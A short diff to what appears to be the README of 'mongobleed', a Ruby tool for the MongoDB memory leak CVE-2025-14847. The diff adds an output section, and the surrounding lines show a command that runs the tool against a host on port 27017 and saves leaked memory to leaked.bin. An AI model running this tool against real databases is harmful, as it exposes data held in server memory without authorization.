@@ -7,7 +7,11 @@
 ```bash
 $ bundle install
 $ bundle exec ruby mongobleed.rb --host 10.0.2.15 --port 27017 --min-offset 20 --max-offset 8192 --output leaked.bin
+```
 
+## Output
+
+```
 ============================================================
   Mongobleed - CVE-2025-14847 MongoDB Memory Leak
   Author: Demetrius Ford - github.com/demetriusford
